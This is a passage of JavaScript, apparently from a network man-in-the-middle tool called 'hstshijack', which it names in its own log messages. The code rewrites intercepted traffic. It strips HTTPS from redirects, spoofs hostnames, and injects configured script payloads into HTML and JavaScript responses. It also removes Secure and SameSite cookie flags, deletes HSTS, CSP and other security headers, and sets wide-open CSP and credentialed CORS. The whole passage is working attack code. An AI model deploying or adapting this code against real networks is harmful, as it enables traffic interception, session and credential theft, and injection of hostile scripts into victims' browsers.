        log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + spoofed_host + reset + " to " + req.Hostname + " and restored HTTPS scheme.");
      }
    }

    /* Restore HTTPS scheme. */
    if (getDomainIndex(req.Hostname) !== -1) {
      /* Restore HTTPS scheme of request if domain is indexed. */
      if (req.Scheme !== "https") {
        req.Scheme = "https";
        log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + bold + req.Hostname + reset + ".");
      }
      /* Restore HTTPS scheme in request headers if domains are indexed. */
      escaped_domain = req.Hostname.replace(selector_all_dots, "\\.").replace(selector_all_dashes, "\\-");
      regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\-\\.]|$)", "ig");
      regexp.lastIndex = 0;
      if (regexp.test(req.Headers)) {
        req.Headers = req.Headers.replace(regexp, "https://" + req.Hostname + "$1");
        log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
      }
    } else { /* If requested domain is not indexed. */
      log_debug(on_blue + "hstshijack" + reset + " Domain " + bold + req.Hostname + reset + " is not indexed.");
      if (req.Scheme !== "https") {
        for (b = 0; b < target_hosts; b++) {
          /* Restore HTTPS scheme of request if domain is targeted. */
          whole_regexp_set = toWholeRegexpSet(target_hosts[b], "");
          if (whole_regexp_set[0].test(req.Hostname)) {
            req.Scheme = "https";
            log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of targeted domain " + bold + req.Hostname + reset + ".");
            break;
          }
          /* Restore HTTPS scheme in request headers if domains are targeted. */
          regexp_set = toRegexpSet(target_hosts[b], "");
          matches = req.Headers.match(regexp_set[0]);
          for (c = 0; c < matches.length; c++) {
            escaped_domain = matches[c].replace(selector_all_dots, "\\.").replace(selector_all_dashes, "\\-");
            regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\-\\.]|$)", "ig");
            req.Headers = req.Headers.replace(regexp, "https://" + matches[c] + "$1");
            log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
          }
        }
      }
    }
  }
}

function onResponse(req, res) {
  res.ReadBody();

  /* Remember HTTPS redirects. */
  location = res.GetHeader("Location", "");
  if (selector_uri_one.test(location)) {
    host = location.replace(selector_uri_two, "$1");
    if (host !== "") {
      indexDomain(host);
    }
  }

  /* Ignore this response if whitelisted. */
  if (whitelist[req.Client.MAC]) {
    if (whitelist[req.Client.MAC].indexOf(req.Hostname) !== -1) {
      log_debug(on_blue + "hstshijack" + reset + " Ignoring response from " + bold + req.Hostname + reset + " for " + bold + req.Client.MAC + reset + ".");
      return;
    }
  } else {
    for (a = 0; a < ignore_hosts.length; a++) {
      var whole_regexp_set;
      if (ignore_hosts[a] !== "*") {
        whole_regexp_set = toWholeRegexpSet(ignore_hosts[a], "");
      }

      if (
           ignore_hosts[a] === "*"
        || whole_regexp_set[0].test(req.Hostname)
      ) {
        log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".");
        return;
      }
    }

    /* Spoof markup bodies. */
    if (
         selector_content_type_html.test(res.ContentType)
      || selector_extension_html.test(req.Path)
    ) {
      /* Prevent meta tag induced CSP restrictions. */
      res.Body = res.Body.replace(
        selector_meta_tag_csp,
        "$1");

      /* Block scripts. */
      for (a = 0; a < block_script_hosts.length; a++) {
        if (
             block_script_hosts[a] === "*"
          || toWholeRegexpSet(block_script_hosts[a], "")[0].test(req.Hostname)
        ) {
          res.Body = res.Body.replace(selector_html_script_open_tag, "<div style=\"display:none;\"$1");
          res.Body = res.Body.replace(selector_html_script_close_tag, "</div$1");
          log_debug(on_blue + "hstshijack" + reset + " Blocked inline script tags in a document from " + bold + req.Hostname + reset + ".");
          break;
        }
      }

      /* Inject payloads. */
      injection = "";
      for (a = 0; a < Object.keys(payloads).length; a++) {
        injecting_host = Object.keys(payloads)[a];
        if (
             injecting_host === "*"
          || toWholeRegexpSet(injecting_host, "")[0].test(req.Hostname)
        ) {
          injection = injection + payloads[injecting_host];
        }
      }
      if (injection !== "") {
	selector_html_magic.lastIndex = 0;
        if (selector_html_magic.test(res.Body.slice(0, 1000))) {
          res.Body = 
            "<script>\n" +
            payload_container_prefix + injection + payload_container_suffix +
            "</script>\n" +
            res.Body;
        }
        log_debug(on_blue + "hstshijack" + reset + " Injected document from " + bold + req.Hostname + reset + " for " + bold + req.Client.MAC + reset);
      }
    }

    /* Spoof JavaScript bodies. */
    if (selector_content_type_js.test(res.ContentType)) {
      /* Block scripts. */
      for (a = 0; a < block_script_hosts.length; a++) {
        if (
             block_script_hosts[a] === "*"
          || toWholeRegexpSet(block_script_hosts[a], "")[0].test(req.Hostname)
        ) {
          res.Body = "";
          log_debug(on_blue + "hstshijack" + reset + " Cleared JavaScript resource from " + bold + req.Hostname + reset + ".");
          break;
        }
      }

      /* Inject payloads. */
      injection = "";
      for (a = 0; a < Object.keys(payloads).length; a++) {
        injecting_host = Object.keys(payloads)[a];
        if (
             injecting_host === "*"
          || toWholeRegexpSet(injecting_host, "")[0].test(req.Hostname)
        ) {
          injection = injection + payloads[injecting_host];
        }
      }
      if (injection !== "") {
        res.Body = payload_container_prefix + injection + payload_container_suffix + res.Body;
        log_debug(on_blue + "hstshijack" + reset + " Injected JavaScript file from " + bold + req.Hostname + reset + " for " + bold + req.Client.MAC + reset);
      }
    }

    /* Strip SSL from location headers. */
    res.Headers = res.Headers
      .replace(selector_scheme_http_https_colon, "$1:")
      .replace(selector_port_https, "$1");

    /* Spoof hosts in headers. */
    for (a = 0; a < target_hosts.length; a++) {
      regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a]);
      res.Headers = res.Headers.replace(regexp_set[0], regexp_set[1]);
    }

    /* Remove secure cookie settings. */
    new_headers = "";
    res.Headers.split("\r\n").forEach(function(headerString){
      if (headerString !== "") {
        matches = headerString.match(selector_header);
        if (matches.length >= 3) {
          header_name = matches[1];
          header_value = matches[2];
          if (selector_header_set_cookie.test(header_name)) {
            new_header_value = "";
            cookie_params = header_value.split(";");
            cookie_params.forEach(function(cookie_param){
              if (cookie_param !== "") {
                stripped_cookie_param = cookie_param.match(selector_strip_whitespace)[1];
                if (!selector_header_set_cookie_secure_samesite.test(stripped_cookie_param)) {
                  if (new_header_value === "") {
                    new_header_value = stripped_cookie_param;
                  } else {
                    new_header_value += "; " + stripped_cookie_param;
                  }
                }
              }
            });
            new_headers += header_name + ": " + new_header_value + "\r\n";
          } else {
            new_headers += header_name + ": " + header_value + "\r\n";
          }
        }
      }
    });

    /* Remove security headers. */
    res.Headers = res.Headers.replace(selector_header_csp, "");
    res.RemoveHeader("Strict-Transport-Security");
    res.RemoveHeader("Content-Security-Policy-Report-Only");
    res.RemoveHeader("Public-Key-Pins");
    res.RemoveHeader("Public-Key-Pins-Report-Only");
    res.RemoveHeader("X-Frame-Options");
    res.RemoveHeader("X-Content-Type-Options");
    res.RemoveHeader("X-Download-Options");
    res.RemoveHeader("X-Permitted-Cross-Domain-Policies");
    res.RemoveHeader("X-XSS-Protection");
    res.RemoveHeader("Expect-Ct");

    /* Set insecure headers. */
    allowed_origin = res.GetHeader("Access-Control-Allow-Origin", "*");
    if (allowed_origin !== "*") {
      for (a = 0; a < target_hosts.length; a++) {
        regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a]);
        regexp_set[0].lastIndex = 0;
        if (regexp_set[0].test(allowed_origin)) {
          allowed_origin = allowed_origin.replace(regexp_set[0], regexp_set[1]);
          break;
        }
      }
    }
    res.SetHeader("Content-Security-Policy", "default-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: filesystem: 'unsafe-inline'; img-src * data: blob: filesystem: 'unsafe-inline'; frame-src * data: blob: filesystem: 'unsafe-inline'; object-src * data: blob: filesystem: 'unsafe-inline'; style-src * data: blob: filesystem: 'unsafe-inline'; report-uri x");
    res.SetHeader("X-WebKit-CSP", "default-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: filesystem: 'unsafe-inline'; img-src * data: blob: filesystem: 'unsafe-inline'; frame-src * data: blob: filesystem: 'unsafe-inline'; object-src * data: blob: filesystem: 'unsafe-inline'; style-src * data: blob: filesystem: 'unsafe-inline'; report-uri x");
    res.SetHeader("X-Content-Security-Policy", "default-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: filesystem: 'unsafe-inline'; img-src * data: blob: filesystem: 'unsafe-inline'; frame-src * data: blob: filesystem: 'unsafe-inline'; object-src * data: blob: filesystem: 'unsafe-inline'; style-src * data: blob: filesystem: 'unsafe-inline'; report-uri x");
    res.SetHeader("Access-Control-Allow-Credentials", "true");
    res.SetHeader("Access-Control-Allow-Origin", allowed_origin);
    res.SetHeader("Access-Control-Allow-Methods", "*");
    res.SetHeader("Access-Control-Allow-Headers", "*");
    res.SetHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    res.SetHeader("Expires", "Fri, 20 Apr 2018 04:20:00 GMT");
    res.SetHeader("Pragma", "no-cache");
  }
}
